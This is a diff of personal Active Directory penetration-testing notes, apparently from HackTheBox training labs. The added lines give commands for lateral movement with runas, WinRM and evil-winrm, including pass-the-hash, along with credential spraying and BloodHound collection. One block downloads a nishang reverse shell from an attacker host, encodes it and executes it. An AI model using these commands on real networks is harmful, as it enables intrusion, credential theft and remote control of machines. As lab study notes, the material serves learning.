@@ -8,21 +8,52 @@ After gaining a foothold, we could use this access to get a feeling for the defe
 ```bash
 # --- Method 1: Run as domain user directly (on Windows domain-joined machine)
 runas /user:<DOMAIN>\<USER> cmd          # Opens a new CMD as <USER>, will ask for <PASSWORD>
-powershell                              # From inside CMD, launch PowerShell as <USER>
+# Runas with /netonly (if machine is not domain-joined)
+runas /netonly /user:<DOMAIN>\<USER> powershell.exe   # Use <USER> creds only for network access
 
-# --- Method 2: WinRM:  Run with PSCredential (inside PowerShell)
+-------------------------
+
+# --- Method 2: WinRM:  Run with PSCredential (inside PowerShell) (restricted only can run some comamnds like whoami)
 $SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force   # Store password securely
 $Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $SecPassword)  
 Enter-PSSession -ComputerName <TARGET> -Credential $Cred    # Remote session as <USER>
 
-# --- Method 3: Runas with /netonly (if machine is not domain-joined)
-runas /netonly /user:<DOMAIN>\<USER> powershell.exe   # Use <USER> creds only for network access
+  # to downalod and excute a revser shll (full shell better )
+Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock {whoami /all}
+Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock {powershell -enc <BASE64-PAYLOAD>} 
+  # BASE64 PAYLOAD : 
+   # powershell reverse shell:
+   # /usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 --> shell.ps1 ,edit it
+   IEX(New-Object Net.WebClient).downloadString("http://<IP>/shell.ps1") #>down.txt
+   cat down.txt | iconv -t utf-16le | base64 -w 0   #-> <BASE64 PAYLOAD>
+powershell -enc <BASE64 PAYLOAD>
+
+  #1: PSCredential Object duble houp problem
+  $SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
+  $Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $SecPassword)
+  get-domainuser -spn -credential $Cred 
+  
+------------------
+
+# --- Method 3: when NO WinRm and NO RDP (so can't entre the pass in runas)
+   # use tool callled RunasCs in sharpcollection repo
+.\RunasCs.exe <USER> <PASS> "c:\windows\temp\shell2.exe" 
 ```
 #### from linux
 **scan this services:**
 ```bash
 nmap -p 3389,5985,5986,445,1433 <target-ip> -sV -Pn
 ```
+
+check all creds over all  domain computers 
+```bash
+# creds combo are splited to users.txt , pass.txt
+nxc winrm 172.16.8.3 172.16.8.20 172.16.8.50 -u users.txt -p pass.txt --no-bruteforce
+  # WINRM       172.16.8.50     5985   ACADEMY-AEN-MS0  [-] INLANEFREIGHT.LOCAL\kdenunez:Welcome1
+  #  WINRM       172.16.8.50     5985   ACADEMY-AEN-MS0  [+] INLANEFREIGHT.LOCAL\backupadm:!qazXSW@ (Pwn3d!)
+
+```
+
 **login to the domain computers** 
 ```bash
 # with crackmapexec
@@ -47,6 +78,8 @@ smbexec.py INLANEFREIGHT.LOCAL/CT059:charlie1@DC01.INLANEFREIGHT.LOCAL -target-i
 
 # Evil-WinRM
 evil-winrm -i <TARGET-IP> -u <USER> -p '<PASSWORD>'  # Remote shell as <USER>
+evil-winrm -i <DC-IP> -u WINRM_SVC -H <NT_HASH> # with hash
+evil-winrm -i <DC-IP> -u <USER> -r <DOMAIN> # Kerberos auth (add tgt first,eg export  KRB5CCNAME=/to/tgt)
 ```
 ## Windows Defender
 
@@ -184,7 +217,7 @@ netexec smb 172.16.6.0/24 -u svc_sql -p "lucky7" -M spider_plus
  head -n 10 /tmp/cme_spider_plus/172.16.5.5.json # find IT/Private/Development/web.config file
  
 # download the file to exam 
-smbclient //172.16.7.3/Department\ Shares -U 'BR086@INLANEFREIGHT.LOCAL%Welcome1' -c 'cd IT; cd Private; cd Development; get web.config; bye'
+smbclient //172.16.7.3/Department/Share -U 'BR086@INLANEFREIGHT.LOCAL%Welcome1' -c 'cd IT; cd Private; cd Development; get web.config; bye'
 
  
 ```
@@ -315,6 +348,10 @@ zip -r ilfreight_bh.zip *.json # creat full zip file
 
 # or auto zip 
 bloodhound-ce-python -c All -ns 172.16.7.3 -d INLANEFREIGHT.LOCAL -u 'mssqlsvc@INLANEFREIGHT.LOCAL' -p 'Sup3rS3cur3maY5ql$3rverE' --zip
+
+# with kerbrouse tgt ticket
+ntpdate <DC-IP> # get time IN DC ex. +25200
+faketime '+25200 sec' bloodhound-ce-python -u CA_SVC -d fluffy.htb -dc DC01.fluffy.htb  -c All --zip -ns 10.129.232.88 -k -no-pass 
 ```
 #### Upload the Zip File into the BloodHound GUI
 ```bash
@@ -463,7 +500,7 @@ Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
   # "-v data" collec all data objects
 ```
 
-## BloodHound
+## BloodHound - SharpHound
 `Bloodhound` is an exceptional open-source tool that can identify attack paths within an AD environment by analyzing the relationships between objects.
  **we must authenticate as a domain user from a Windows attack host positioned within the network (but not joined to the domain) or transfer the tool to a domain-joined host.**
  ==For our purposes, we will work with SharpHound.exe already on the attack host=
